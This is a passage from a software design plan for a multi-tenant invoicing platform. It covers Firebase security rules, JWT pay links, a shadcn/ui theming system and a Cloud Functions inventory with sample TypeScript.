2. **Correct historical behavior.** If a contractor rebrands (new logo, new tax rate, new business number) six months after an invoice was sent, the old invoice still renders with the branding it had at send time. This is what customers expect and what regulators expect for tax documents.
3. **Avoids cross-doc `get()` in rules.** Rules-level `get()` calls are expensive and rate-limited. Snapshotting keeps rule evaluation to a single-doc read.

Snapshot is written by the Cloud Function at invoice/quote creation time, not by the client. Client never has permission to write `tenantSnapshot` directly.

### Invoice pay-link fields (no-auth payment flow)

Every invoice document carries a **signed pay-link token** so customers can pay directly from the email without going through the portal magic-link auth flow. This is the industry standard (Stripe Invoicing, QuickBooks, FreshBooks) — forcing customers through auth to pay a single bill measurably increases days-to-payment.

Added to the invoice doc at creation time (by the `createInvoice` Cloud Function, admin SDK only):

```typescript
{
  // ... existing invoice fields ...
  payToken,                 // JWT signed with a secret — see Phase 2
                            // Payload: { invoiceId, tenantId, exp }
                            // Verified by the public /pay/[token] route without
                            // requiring Firebase auth.
  payTokenExpiresAt,        // Timestamp, default issueDate + 60 days.
                            // Token is invalidated on invoice status = 'paid'
                            // or on explicit regeneration from dashboard.
  payTokenVersion,          // Integer, default 1. Incremented when a tenant
                            // "regenerates pay link" from the dashboard, which
                            // invalidates prior tokens for the same invoice.
                            // Stored inside the JWT payload; mismatch on verify → reject.
}
```

Why a JWT instead of a random token stored in Firestore: the verify path on every pay-page load would otherwise be a Firestore read per click. With a JWT, the pay page verifies with a single HMAC check — no database hit on the hot path. The Firestore-side `payTokenVersion` is only read when the checkout session is actually created (after the customer clicks "Pay"), so invalidation still works but the read cost is one per actual payment attempt, not one per page view.

### Auth custom claims

Set only by Cloud Functions — `onSignup`, `onAcceptInvite`, `setUserRole` — always merged over existing claims:

```typescript
{
  tenantId: "acme-plumbing",
  role: "owner" | "admin" | "staff"
}
```

Platform admin (Reggie) — granted out-of-band by `functions/src/scripts/setPlatformAdmin.ts` from a trusted machine, never through a deployed endpoint:

```typescript
{ platformAdmin: true }   // plus a platformAdmins/{uid} doc
```

Platform admins have no `tenantId` claim. No rule lets any client — platform admin included — write `entitlements`; plans and feature overrides are edited in the Firebase Console with admin credentials.

### Security rules (as built)

`firestore.rules` is authoritative, verified by 42 emulator tests in `functions/test/rules/firestore.test.ts`. The April sketch that used to live here allowed client writes to `meta`, `customers`, `recurringInvoices`, and `invitations`; the build tightened every one of them to callable-only writes.

Two identity patterns are enforced:

- **Tenant users** (contractors and their staff) carry a `tenantId` claim and see their tenant's documents.
- **Customer users** (the people being invoiced) carry no `tenantId`; they authenticate with a verified email and can only read invoices/quotes whose `customer.email` equals their lowercased auth email. They never write.

| Path | Read | Write |
|---|---|---|
| `users/{uid}` | the user | none |
| `userTenantMemberships/{uid}_{tenantId}` | the user (doc id prefix match) | none |
| `tenants/{t}/meta/*`, `entitlements/*`, `counters/*`, `customers/*`, `recurringInvoices/*`, `invitations/*` | members of tenant `t` | none |
| `tenants/{t}/invoices/{id}`, `tenants/{t}/quotes/{id}` | members of `t`, **or** an `email_verified` user whose lowercased email equals `customer.email` | none |
| `tenants/{t}/invoices/{id}/paymentIncidents/*` | members of `t` | none |
| `tenants/{t}/invoices/{id}/payAttempts/*` | none | none |
| `customDomains/*`, `stripeAccounts/*`, `stripeEvents/*`, `emailSends/*` | none | none |
| `platformAdmins/*` | `platformAdmin` claim | none |
| anything else | none | none |

Open issues: the customer branch still matches drafts (A-05).

**Storage (`storage.rules`, 18 emulator tests in `functions/test/rules/storage.test.ts`):**

| Path | Read | Write |
|---|---|---|
| `tenants/{t}/{logo\|favicon}.{png\|jpg\|jpeg\|webp\|svg\|ico}` | members of `t` | create/update by `owner`/`admin` of `t`; content type `image/png\|jpeg\|webp\|svg+xml\|x-icon\|vnd.microsoft.icon`; under 2 MB; no deletes |
| `tenants/{t}/**` (snapshots, anything nested) | members of `t` | none (Admin SDK only) |
| anything else | none | none |

Customers and the PDF service never read Storage directly — they use the public download URLs stored in meta or the base64 logo in the snapshot. `src/lib/storage/uploadBrandingAsset.ts` maps content type to extension with the same allowlist and refuses anything else before uploading.

### Critical rule properties
1. **Customer access is read-only.** The `|| email_verified` branch only appears in `allow read`, never in `allow write`.
2. **Customer access is per-document.** A customer reading invoice X cannot list or enumerate other invoices — Firestore rules don't grant collection-level reads from a single-doc match. Customer-portal queries must use direct document reads or filtered queries where the rule matches each returned doc individually (see "Customer portal queries" below).
3. **`email_verified` is load-bearing.** Magic-link auth sets this automatically. If a customer signs in with unverified email, they get nothing. Rules must always require `email_verified == true` on the customer branch.
4. **Customers cannot read `meta`, `entitlements`, `customers` collection, or `recurringInvoices`.** All branding they need is denormalized into `tenantSnapshot` on the invoice/quote they're reading.
5. **Counter writes are blocked at the rules layer** — only admin SDK (Cloud Functions) can write counters, which matches the race-safe `consumeNumber()` pattern.
6. **Invoice/quote/user writes are admin-SDK-only.** Direct client writes are blocked. All mutations flow through Cloud Function callables that validate inputs, enforce tax math, and lock fields the client must never set (`tenantSnapshot`, `createdAt`, `tenantId`, `status` transitions). Prevents the C1 / C6 forgery class entirely. Full callable list in Phase 2.
7. **Email comparison is case-insensitive by convention.** Customer emails are stored lowercase (Cloud Functions normalize at write boundary). Auth tokens carry whatever case the user signed in with, so rules call `request.auth.token.email.lower()` before comparing. **Both sides must agree on lowercase.** A non-normalized write at any path will silently break customer access.

### Customer portal queries — the list-access workaround

A customer landing on `/portal` needs to see their own list of invoices across whichever tenants have invoiced them. Firestore rules can't grant list access based on a document field match alone — `list()` queries require the rule to match the *query constraints*, not the returned docs.

**Pattern:** use `collectionGroup('invoices')` queries filtered by `customer.email == auth.token.email`:

```typescript
// Customer portal query
db.collectionGroup('invoices')
  .where('customer.email', '==', currentUser.email)
  .orderBy('createdAt', 'desc')
```

With a matching rule addition:
```
match /{path=**}/invoices/{invoiceId} {
  allow list: if request.auth.token.email_verified == true
              && request.query.limit <= 100
              && 'customer.email' in request.query.filters
              && request.query.filters['customer.email'] == request.auth.token.email;
}
```

The actual syntax for query-constraint checks in Firestore rules has some quirks — finalize this rule against the Firebase emulator before deploying. The conceptual pattern is: require the query to filter on `customer.email` equal to the caller's auth email, and enforce a reasonable `limit`.

A simpler fallback if the `request.query` pattern proves fragile: have a Cloud Function `getCustomerInvoices()` that runs with admin SDK, verifies the caller's auth email, and returns the list. Trades rule-level security for function-level security, but it works and is easier to reason about.

**Decision deferred to Phase 1 implementation:** start with the Cloud Function approach (`getCustomerInvoices`), migrate to `collectionGroup` + rules if the function hits latency issues.

### Data migration
No migration needed. Existing Firestore data is 73 test invoices — discarded. Fresh start in the new Firebase project.

**Deliverables for Phase 1:**
- New Firebase project provisioned (`techflow-saas-dev`, Firestore `northamerica-northeast2`)
- Firestore rules deployed
- **Firestore indexes deployed (`firestore.indexes.json`)** — required from day one. The `getCustomerInvoices` query uses a `collectionGroup('invoices')` query with `.where('customer.email', '==', email).orderBy('createdAt', 'desc')`. Without a composite index defined for this collection group, Firestore throws a runtime error on the first customer portal query. Known required indexes:
  - Collection group `invoices`: `customer.email` (ASC) + `createdAt` (DESC)
  - Collection group `quotes`: `customer.email` (ASC) + `createdAt` (DESC) (same pattern for customer quote access)
  - Add additional indexes as queries are finalized in Phase 2. The `firestore.indexes.json` file lives in the repo and is deployed alongside rules via `firebase deploy --only firestore`.
  - **Note:** the Stripe webhook does NOT require a `collectionGroup('meta')` index because we use the `stripeAccounts/{stripeAccountId}` reverse lookup collection instead. Direct doc read, no composite index needed.
- **Firebase Storage rules deployed (`storage.rules`)** — separate from Firestore rules. Firebase Storage has its own rules file. Required rules:
  - Tenant users can read files under `tenants/{tenantId}/` where their token's `tenantId` matches. As built, client writes are limited to owner/admin logo and favicon uploads; everything else is Admin SDK only (see "Security Rules (as built)" → Storage)
  - Customers cannot access Storage directly. Logos and favicons are served via **Firebase Storage public download URLs** (generated by `getDownloadURL()` at upload time). The download URL includes an access token in the query string and is publicly fetchable without Storage rules, which is why the URL itself (not the Storage path) must be what's stored in `meta.logoUrl` / `meta.faviconUrl` and fetched when `createInvoice` inlines it into `tenantSnapshot.logo`. If the Storage path is stored instead, customers' PDFs and portal pages will silently 403 on the logo.
  - No unauthenticated access to the Storage bucket itself
- Custom-claim helpers in Cloud Functions for signup + role changes
- Platform admin user created (Reggie) with the `platformAdmin: true` claim (`functions/src/scripts/setPlatformAdmin.ts`)

**Estimated effort:** 4–5 days

---

## Phase 1.5 — Design System (shadcn/ui + tenant theming)

This phase lands the visual foundation **before** any Phase 2 UI work. Every form, button, dialog, toast, badge, and alert built from Phase 2 onward composes the primitives scaffolded here. Skipping or deferring this phase guarantees a Phase 3 rebuild — the current Vite app's patchy CSS (dual `cs-toast`/`inv-toast` systems, leaking `.form-group` margins, ad-hoc dropdown styles) is exactly the failure mode this prevents.

### Why shadcn/ui

- **Copy-paste, not a dependency.** Components live in `src/components/ui/` and are owned by us. No upstream version-lock, no breaking-change surprises, full edit access.
- **Built on Radix primitives** — accessibility (focus traps, ARIA, keyboard nav, screen-reader semantics) is correct by default, not an afterthought.
- **Semantic CSS-variable token system** — clean separation between platform tokens (locked) and tenant tokens (overridable).
- **Industry standard for Next.js + Tailwind SaaS in 2026.** Opus and Sonnet both know every component intimately, which speeds Phase 2/3 generation.

### Component scaffold list (scoped to Phase 2/3 needs only)

Install these now. Add others when a later phase actually consumes them — no speculative scaffolding.

| Component | Used by |
|---|---|
| `Button` | every form, every action |
| `Input`, `Label`, `Textarea` | all forms |
| `Form` (react-hook-form + zod wrapper) | signup, invoice form, settings, accept-invite |
| `Card`, `CardHeader`, `CardContent` | dashboard tiles, portal invoice list |
| `Dialog`, `AlertDialog` | confirm-destructive (delete invoice, revoke staff) |
| `Select`, `Checkbox`, `RadioGroup` | invoice form (HST toggle, recurring config), settings |
| `Badge` | invoice status (paid/unpaid/overdue/draft/cancelled) |
| `Alert` (with `destructive` variant) | inline form errors, validation summaries |
| `Sonner` (toast) | the single platform-wide toast system — replaces `cs-toast` + `inv-toast` |
| `Table` | invoice list, customer list, staff list |
| `DropdownMenu` | row actions, header user menu |
| `Tabs` | settings page sections |
| `Skeleton` | loading states (dashboard, portal invoice list) |
| `Separator` | visual dividers in cards |

Anything else (Command/Combobox, Calendar, Popover, Sheet, Accordion, etc.) gets added when its consuming phase needs it.

### Token system (full list)

shadcn ships these as CSS variables. They live in `src/app/globals.css` under `:root` (light) and `.dark` (dark). All Tailwind utility colors map to these tokens (`bg-background`, `text-muted-foreground`, etc.) — **no raw hex colors anywhere in component code.**

```
--background          /* page background */
--foreground          /* primary text */
--card                /* card surface */
--card-foreground
--popover             /* dropdown / dialog surface */
--popover-foreground
--primary             /* brand — TENANT OVERRIDABLE */
--primary-foreground  /* text on primary — computed from --primary contrast */
--secondary           /* secondary brand — TENANT OVERRIDABLE */
--secondary-foreground
--muted               /* subtle backgrounds (skeletons, hover states) */
--muted-foreground    /* secondary text */
--accent              /* hover surfaces */
--accent-foreground
--destructive         /* error red — PLATFORM LOCKED */
--destructive-foreground
--success             /* success green — PLATFORM LOCKED (custom add) */
--success-foreground
--warning             /* warning amber — PLATFORM LOCKED (custom add) */
--warning-foreground
--border              /* all borders */
--input               /* input border */
--ring                /* focus ring */
--radius              /* border radius scale */
```

`--success` and `--warning` are not in stock shadcn but are required for invoice status semantics — add them to the token file at install time.

### Tenant override scope (locked)

Tenants override **only** `--primary` and `--secondary`. Every other token stays platform-controlled.

```tsx
// src/app/(dashboard)/layout.tsx and src/app/(portal)/layout.tsx
<div
  style={{
    '--primary': tenant.primaryColor,
    '--primary-foreground': computeForeground(tenant.primaryColor),
    '--secondary': tenant.secondaryColor,
    '--secondary-foreground': computeForeground(tenant.secondaryColor),
  } as React.CSSProperties}
>
  {children}
</div>
```

**Why locked:** if tenants could override `--destructive`, error messages on one tenant's portal could end up green and silently misread as success. The same risk applies to `--success`, `--warning`, `--muted-foreground`, `--background`. Brand color belongs to the tenant; semantic meaning belongs to the platform. This matches the existing memory rule: "brand/semantic hues locked; opacity/legibility fixes on neutral whites are allowed."

### Contrast guard (validation + render fallback — both required)

Two layers, because either alone fails in a real edge case:

**Layer 1 — Validation at signup / settings save.** When a tenant picks `primaryColor` or `secondaryColor`, validate against WCAG AA contrast (≥ 4.5:1) on white background. Reject and show inline error if it fails. User must pick again.

```typescript
// src/lib/design/contrast.ts
export function meetsWcagAA(hex: string, against: string = '#FFFFFF'): boolean {
  return contrastRatio(hex, against) >= 4.5;
}
```

Wired into the signup wizard color picker and `settings/page.tsx` branding form. Server-side `updateTenantBranding` callable re-validates (never trust the client).

**Layer 2 — Computed `--foreground` at render.** Even with validation, edge cases exist (legacy tenants, future migrations, color picked against white but rendered on a dark surface). Always compute `--primary-foreground` as black or white based on the luminance of `--primary`:

```typescript
// src/lib/design/contrast.ts
export function computeForeground(hex: string): '#000000' | '#FFFFFF' {
  const luminance = relativeLuminance(hex);
  return luminance > 0.5 ? '#000000' : '#FFFFFF';
}
```

Belt + suspenders: validation prevents the bad input; computed fallback prevents an unreadable button if bad input ever slips through.

### Dark / light mode strategy (decision, not option)

| Surface | Mode | Why |
|---|---|---|
| Tenant admin dashboard (`/dashboard/*`) | **dark** | Matches current Vite app, less eye strain for daily power-user work, signals "tool" |
| Customer portal (`/portal/*`) | **light** | Higher trust for "pay this invoice," matches what homeowners expect from financial UIs, easier for accessibility |
| Branded login pages (`/portal/login`, tenant signup) | **light** | Public-facing, professional-first impression |
| Generated PDFs | **light** | Already light (printed/emailed documents) |

**No user toggle.** A toggle adds state to persist, doubles QA surface, and undermines the "portal = trustworthy/light, dashboard = working tool/dark" intent. If a user demands it later, it's a one-flag addition — easier to add than to remove.

Tailwind config: dashboard layout sets `<html className="dark">` server-side; portal layout omits it. No flash-of-wrong-theme because mode is a layout-level decision, not a client toggle.

### Font system

- **Platform default:** Inter, loaded via `next/font/google` in `src/app/layout.tsx`. Inter is shadcn's convention and renders cleanly at all sizes.
- **Tenant `fontFamily` override scope:** customer-facing surfaces only — portal pages and generated PDFs. The admin dashboard always renders in Inter regardless of tenant `fontFamily`.
- **Why scoped:** the dashboard is Reggie's app dressed in tenant branding for tenant staff; consistent font there reduces support burden. The portal and PDFs are what the tenant's customers see — full brand expression matters there.
- **Allowed tenant fonts:** curated list (Inter, Roboto, Open Sans, Lato, Montserrat, Poppins, Source Sans 3, Merriweather). All loaded via `next/font/google` with `display: 'swap'`. Free-text font input is not allowed (prevents broken renders, missing-font fallbacks, and supply-chain risk from arbitrary `@import` URLs).

### Toast system (single source — Sonner)

shadcn ships `Sonner` as the recommended toast. Use **only** Sonner across the entire platform. The current Vite app's dual `cs-toast` (CustomerSection) and `inv-toast` (InvoiceForm) pattern is the exact failure mode being eliminated.

```tsx
// src/app/layout.tsx
import { Toaster } from '@/components/ui/sonner';

<body>
  {children}
  <Toaster position="bottom-center" richColors closeButton />
</body>
```

Mounted once at the root layout. All components call `toast.success(...)` / `toast.error(...)` from `sonner`. No component-scoped toast state, no fixed-position manual divs.

### Status badge mapping (canonical)

Invoice and quote status badges use the shadcn `Badge` component with these variants (extend `Badge` variants in `src/components/ui/badge.tsx` to add `success`/`warning` mapped to the new tokens):

| Status | Variant | Token |
|---|---|---|
| `paid` | `success` | `--success` |
| `unpaid` | `default` | `--primary` |
| `overdue` | `destructive` | `--destructive` |
| `partial` | `warning` | `--warning` |
| `refunded` | `secondary` | `--muted` |
| `partially-refunded` | `warning` | `--warning` |
| `draft` | `outline` | `--border` |
| `sent` | `default` | `--primary` |

Centralized in `src/lib/invoices/statusBadge.ts` as `getInvoiceStatusBadgeProps(status)` and `getQuoteStatusBadgeProps(status)`. Never inline status → color logic at the call site.

**Note on `unpaid` (intentional departure from the old Vite app):** the old app showed unpaid invoices in red, which was aggressive — it alarmed tenants about invoices that weren't even overdue yet. The new mapping reserves red (`destructive`) for `overdue` only, where it carries real signal. `unpaid` uses the tenant's brand color (`--primary`) as a neutral "awaiting payment" state. This matches the Stripe Dashboard, QuickBooks, and FreshBooks conventions. The transition `unpaid → overdue` happens automatically when `Date.now() > invoice.dueDate`, triggered by a scheduled Cloud Function or computed at read time — implementation detail for Phase 2.

### Composition rule

shadcn primitives (`Button`, `Input`, `Card`, etc.) live in `src/components/ui/` and are **never modified except to add token bindings**. Domain components (`InvoiceForm`, `LineItemEditor`, `RecurringConfig`, `PortalInvoiceList`, `SignupWizard`, etc.) live in `src/components/invoices/`, `src/components/portal/`, etc. and **compose** the ui primitives.

Rule: **no domain component reaches for raw HTML form elements or Tailwind color utilities with hex values.** If `Input` doesn't do what you need, extend `Input` in `src/components/ui/input.tsx` — don't write a one-off in the domain component.

### Phase 1.5 deliverables checklist

- [x] `npx shadcn@latest init` run, base `globals.css` + `tailwind.config.ts` + `components.json` committed
- [x] All 14 scoped components scaffolded into `src/components/ui/`
- [x] `--success` and `--warning` tokens added to `globals.css` (light + dark)
- [x] `Badge` variants extended with `success` and `warning`
- [x] `src/lib/design/contrast.ts` with `meetsWcagAA()` + `computeForeground()` + unit tests
- [x] `src/lib/invoices/statusBadge.ts` with canonical status → variant mapping
- [x] Dashboard layout sets `<html className="dark">`; portal layout sets light
- [x] Inter loaded via `next/font/google` in root layout
- [x] Curated tenant font list defined in `src/lib/design/fonts.ts` with `next/font` loaders
- [x] `Toaster` mounted once in root layout; all toast calls use `sonner`
- [x] Tenant override pattern (`--primary`/`--secondary` only, with computed `--primary-foreground`) wired in dashboard + portal layouts
- [x] One reference page (e.g., `/dashboard/style-guide`, dev-only, gated by env) renders every primitive in light + dark + with a sample tenant override, for visual regression review

**Estimated effort:** 2 days

---

## Phase 2 — Cloud Functions Rewrite

### Core patterns

Every callable function follows this shape:
```typescript
export const someFunction = onCall(async (request) => {
  const tenantId = request.auth?.token.tenantId;
  if (!tenantId) throw new HttpsError('unauthenticated', 'No tenant');

  await requireFeature(tenantId, 'quotes');  // if feature-gated

  // do work scoped to tenants/{tenantId}/...
});
```

### `requireFeature()` helper

```typescript
// functions/src/shared/requireFeature.ts (as built)
export async function loadFeatures(tenantId: string): Promise<ResolvedFeatures> {
  const snap = await db.doc(`tenants/${tenantId}/entitlements/current`).get();
  const overrides = snap.exists ? (snap.data()?.features ?? {}) : {};
  // every FEATURE_DEFAULTS key resolved through resolveFeature(key, overrides)
}

export async function requireFeature(
  tenantId: string,
  key: FeatureKey,
): Promise<ResolvedFeatures> {
  const features = await loadFeatures(tenantId);
  if (!features[key]) {
    throw new HttpsError('permission-denied',
      `Feature '${key}' is not enabled for this tenant.`);
  }
  return features; // callers reuse it, e.g. buildTenantSnapshot(meta, features)
}
```

### Function inventory (as built)

Region: callables, HTTP functions, and Firestore triggers run in `northamerica-northeast2`; scheduled functions in `northamerica-northeast1` (D2). Tenant callables require a `tenantId` claim (`requireTenant`); feature gates use `requireFeature`, which throws `permission-denied` and returns the resolved feature map.

**Tenant-facing callables**

| Function | Feature gate | Role / notes |
|---|---|---|
| `onSignup` | — | signed-in user without a membership; creates the tenant (Phase 5) |
| `setUserRole` | — | owner |
| `updateUserProfile` | — | self; `displayName` only |
| `createInvitation` | — | owner/admin; invite email via SES, one send per invitation |
| `onAcceptInvite` | — | invitee whose verified email matches |
| `revokeInvitation` | — | owner/admin; stamps `revokedAt` |
| `updateTenantBranding` | — | owner/admin; business info, branding, tax, currency, `contactEmail` |
| `updatePaymentSettings` | `cardSurcharge` to switch surcharging on (D3) | owner/admin; e-Transfer email, surcharge settings |
| `createInvoice`, `updateInvoice` | `invoices` | any role |
| `deleteInvoice`, `markInvoicePaid`, `regenerateInvoicePayLink` | `invoices` | owner/admin |
| `sendInvoiceEmail`, `previewInvoicePDF` | `invoices` | any role |
| `createQuote`, `updateQuote`, `sendQuoteEmail`, `previewQuotePDF` | `quotes` | any role |
| `deleteQuote` | `quotes` | owner/admin |
| `convertQuoteToInvoice` | `quotes` + `invoices` | any role |
| `createRecurringInvoice` | `recurringInvoices` | any role |
| `startConnectOnboarding`, `completeConnectOnboarding` | `stripePayments` | owner/admin (D1 account configuration) |
| `setupCustomDomain` | `customDomain` | owner/admin |
| `removeCustomDomain`, `recheckCustomDomain` | — | owner/admin |

Not built: `upsertCustomer`, `deleteCustomer`, `updateRecurringInvoice` (A-10). The April plan's tenant-initiated `createCheckoutSession` was dropped — every card payment goes through the pay link.

**Customer-facing callables** (require `email_verified`, no `tenantId` claim)

| Function | Notes |
|---|---|
| `getCustomerInvoices` | collection-group query on the lowercased email, max 100 (drafts + logo size A-05; pagination R8) |
| `getCustomerInvoiceDetail` | email must match `customer.email`; strips `payToken` |

Not built: `getCustomerQuotes` (P6). Customer PDF download is the Next.js route `GET /api/pdf/invoice` (and `/api/pdf/quote`) with a Firebase ID token and dual auth — tenant claim or verified matching email — replacing the planned `downloadInvoicePDF` callable.

**Token-authenticated callables** (no Firebase auth — the signed pay token is the auth)

| Function | Notes |
|---|---|
| `verifyInvoicePayToken` | Returns a discriminated `VerifyResult` (`ok` \| `paid` \| `refunded` \| `regenerated` \| `not-available`); surcharge from the snapshot plus the `cardSurcharge` kill switch (D3) |
| `createPayTokenCheckoutSession` | `stripePayments` of the invoice's tenant; max 10 sessions per invoice per 24h; direct charge on the tenant's Stripe account |

There is intentionally no `payInvoice` callable. The portal's "Pay Now" redirects to `/pay/{payToken}` — one checkout code path.

**Infrastructure**

| Function | Trigger | Notes |
|---|---|---|
| `processRecurringInvoices` | schedule, daily 06:00 UTC | skips tenants without `recurringInvoices`; auto-pauses a template after 3 consecutive failures |
| `scheduledFirestoreExport` | schedule, daily 03:00 UTC | `gs://{projectId}-firestore-backups/daily/{YYYY-MM-DD}` |
| `recheckPendingDomains` | schedule, every 5 minutes | Vercel domain status for tenants in `dns_pending` / `ssl_pending` |
| `onPaymentIncidentCreated` | Firestore create on `tenants/{t}/invoices/{i}/paymentIncidents/{id}` | emails active owners (D5) |
| `sesEventsWebhook` | HTTPS (SNS subscription) | SES delivery/bounce/complaint events → `lastEmailStatus` (D5) |

Stripe webhooks are Next.js routes, not Cloud Functions — see Phase 4.

### Invoice/quote CRUD pattern (admin-SDK only — C1 fix)

All invoice and quote mutations go through dedicated callables; direct client writes are blocked by rules. This removes the `tenantSnapshot`-forgery and field-tamper class of bugs entirely.

`createInvoice` (`functions/src/invoices/createInvoice.ts`), in order:

1. `readClaims` → `requireTenant`; `requireFeature(tenantId, "invoices")` returns the resolved feature map.
2. `validateInvoiceInput` — customer name/email (email lowercased at the write boundary, C2); 1–100 line items through the shared `validateLineItems`, where each line's `taxable` defaults to `applyTax` (D4); `dueDate` and optional `issueDate` as `YYYY-MM-DD`; notes ≤ 2000 characters.
3. Read `meta/settings`. `buildTenantSnapshot(meta, features)` freezes branding, tax, currency, e-Transfer email, and the effective surcharge flag (D3); `inlineLogoOrThrow` embeds the logo as a ≤ 500 KB base64 data URL and fails the whole create if the logo can't be fetched.
4. `computeLineItems` and `computeInvoiceTotals(lineItems, { rate: meta.taxRate, name: meta.taxName })` — server math only; client totals are never accepted.
5. One transaction: increment `counters/invoice.value`, create `invoices/{prefix}-{0001}` with `status: 'draft'`, and sign the pay-token JWT (`PAY_TOKEN_SECRET`, 60 days, `payTokenVersion: 1`).

**`updateInvoice`** accepts only mutable fields (customer, line items, `applyTax`, dates, notes) and recomputes totals from the **frozen snapshot's** tax rate and name — never current meta. Paid and refunded invoices are immutable. Editing a *sent* invoice does not yet bump `payTokenVersion` (A-08).

**`deleteInvoice`** — owner/admin; hard delete; refuses `paid` (A-12: sent invoices should be voided instead).

**`markInvoicePaid`** — owner/admin manual fallback for payments outside Stripe (`manual` | `etransfer` | `cash`); refuses drafts and double payment. The pay token is implicitly dead afterwards because verify and checkout only accept `sent | unpaid | overdue | partial`.

Quotes mirror this (`createQuote`, `updateQuote`, `deleteQuote`; no pay token). `convertQuoteToInvoice` reuses the snapshot and counter logic and carries per-line taxability through.

### Invoice pay-link generation and verification

**At invoice creation (`createInvoice` callable, after counter write, before return):**

```typescript
import { sign } from 'jsonwebtoken';
import { defineSecret } from 'firebase-functions/params';

const PAY_TOKEN_SECRET = defineSecret('PAY_TOKEN_SECRET');

// ... inside createInvoice transaction ...
const payTokenExpiresAt = Timestamp.fromMillis(Date.now() + 60 * 24 * 60 * 60 * 1000); // 60 days
const payTokenVersion = 1;
const payToken = sign(
  { invoiceId: id, tenantId, v: payTokenVersion },
  PAY_TOKEN_SECRET.value(),
  { expiresIn: '60d' }
);
tx.update(invoiceRef, { payToken, payTokenExpiresAt, payTokenVersion });
```

**`verifyInvoicePayToken` callable (public, no Firebase auth):**

Returns a **structured status object** rather than throwing on "already paid" or "regenerated." The pay page (and the post-checkout success page which polls this) needs to BRANCH on the status, not catch errors and pattern-match on messages (P1 — string-matched error flow is fragile). Only token-shape failures (invalid signature, expired JWT, missing invoice) throw — those are genuine "cannot continue" states.

```typescript
type VerifyResult =
  | { outcome: 'ok'; invoice: PayPagePayload }                          // ready to pay
  | { outcome: 'paid'; paidAt: number; invoiceNumber: string }          // already paid
  | { outcome: 'refunded'; refundedAt: number; invoiceNumber: string }  // refunded after payment
  | { outcome: 'regenerated' }                                          // newer link exists
  | { outcome: 'not-available' };                                       // draft/archived/deleted

export const verifyInvoicePayToken = onCall({ secrets: [PAY_TOKEN_SECRET] }, async (request): Promise<VerifyResult> => {
  const { token } = request.data;
  if (!token || typeof token !== 'string') {
    throw new HttpsError('invalid-argument', 'Token required');
  }

  let payload: { invoiceId: string; tenantId: string; v: number };
  try {
    // JWT verify checks signature AND exp claim. Expiry is enforced here,
    // NOT against the Firestore payTokenExpiresAt field — see P3 note below.
    payload = verify(token, PAY_TOKEN_SECRET.value()) as any;
  } catch {
    throw new HttpsError('permission-denied', 'Invalid or expired pay link');
  }

  const invoiceRef = db.doc(`tenants/${payload.tenantId}/invoices/${payload.invoiceId}`);
  const snap = await invoiceRef.get();
  if (!snap.exists) throw new HttpsError('not-found', 'Invoice not found');

  const invoice = snap.data()!;

  // Structured-status branching — these are legitimate states the pay page must render,
  // not errors. Throwing and catching on the client would be fragile (P1 fix).
  if (invoice.deletedAt) return { outcome: 'not-available' };
  if (invoice.payTokenVersion !== payload.v) return { outcome: 'regenerated' };
  if (invoice.status === 'refunded' || invoice.status === 'partially-refunded') {
    return {
      outcome: 'refunded',
      refundedAt: invoice.refundedAt?.toMillis?.() ?? 0,
      invoiceNumber: invoice.invoiceNumber,
    };
  }
  if (invoice.status === 'paid') {
    return {
      outcome: 'paid',
      paidAt: invoice.paidAt?.toMillis?.() ?? 0,
      invoiceNumber: invoice.invoiceNumber,
    };
  }
  // P4 — allow-list payable statuses. Draft/archived invoices must NOT be payable
  // even if a tenant accidentally shared the pay link (e.g. pasted it in chat to
  // preview, then edited the draft). Only 'sent', 'unpaid', 'overdue', 'partial'
  // are accepted payment targets.
  const PAYABLE_STATUSES = ['sent', 'unpaid', 'overdue', 'partial'] as const;
  if (!PAYABLE_STATUSES.includes(invoice.status)) {
    return { outcome: 'not-available' };
  }

  // Return minimal payload for rendering the public pay page.
  return {
    outcome: 'ok',
    invoice: {
      invoiceId: payload.invoiceId,
      tenantId: payload.tenantId,
      invoiceNumber: invoice.invoiceNumber,
      customer: { name: invoice.customer.name, email: invoice.customer.email },
      lineItems: invoice.lineItems,
      totals: invoice.totals,
      status: invoice.status,
      tenantSnapshot: invoice.tenantSnapshot,
      chargeCustomerCardFees: Boolean(invoice.tenantSnapshot.chargeCustomerCardFees),
      cardFeePercent: invoice.tenantSnapshot.cardFeePercent ?? 0,
      etransferEmail: invoice.tenantSnapshot.etransferEmail ?? null,
    },
  };
});
```

**Pay page branches on `outcome`:** `ok` → render pay UI; `paid` → "Thanks, this invoice was paid on {date}"; `refunded` → "This invoice was refunded on {date}"; `regenerated` → "This pay link is no longer valid. Check your email for a newer invoice, or contact {tenant.name}."; `not-available` → generic "This invoice is not currently available for payment. Contact {tenant.name} if you believe this is an error." The success page at `/pay/[token]/success` polls with backoff (max 5 attempts, 1s apart) until it sees `outcome === 'paid'` — no string matching required.

**P3 — JWT `exp` is the authoritative expiry.** The `payTokenExpiresAt` Firestore timestamp is **display-only** (used in the dashboard to show tenants "this invoice's pay link expires in N days" and in the `regenerateInvoicePayLink` CTA logic). The `verify()` call enforces expiry via the JWT `exp` claim — if the two ever diverge (manual Firestore edit, clock skew, migration bug), the JWT wins because that's what the verify path actually checks. Do not add code that reads `payTokenExpiresAt` for authorization decisions.

Note: `chargeCustomerCardFees`, `cardFeePercent`, and `etransferEmail` must be added to the `tenantSnapshot` write in `createInvoice` so the pay page can render them without a second meta read.

**`regenerateInvoicePayLink`** (owner/admin callable) — increments `payTokenVersion`, signs a new JWT, overwrites `payToken` and `payTokenExpiresAt`. Useful when a customer accidentally forwards the email or a tenant wants to kill an old link.

**Race-condition guarantee (C2):** a customer can have a Stripe Checkout session already open at the moment of regeneration — Stripe Checkout sessions live for 24 hours after creation and can be completed at any point. The session's `metadata.payTokenVersion` is frozen at session-creation time. The webhook (Phase 4) detects this mismatch and auto-refunds. `regenerateInvoicePayLink` itself does NOT need to call `stripe.checkout.sessions.expire()` — letting the webhook handle it keeps the race-guard logic in one place (the webhook) instead of two (regenerate + webhook), and correctly handles the case where the customer was literally in the middle of typing their card number when regenerate fired.

### React Email + Amazon SES — transactional email system

> **D5 (2026-09-13):** Amazon SES replaced Resend. Templates, design principles, and sanitization rules are unchanged; transport, idempotency, and delivery feedback moved to SES.

**All outgoing email is rendered with React Email in Cloud Functions and sent through `functions/src/emails/send.ts`.** No other file talks to SES, and the Next.js app sends no email.

Why React Email: email clients render HTML and CSS very differently (Gmail strips styles, Outlook mangles tables, Apple Mail auto-inverts in dark mode). A shared component system handles inline CSS and dark-mode meta tags so templates don't break in production, and every email composes the same layout instead of hand-rolling HTML.

**Package layout (as built):**

```
functions/src/emails/
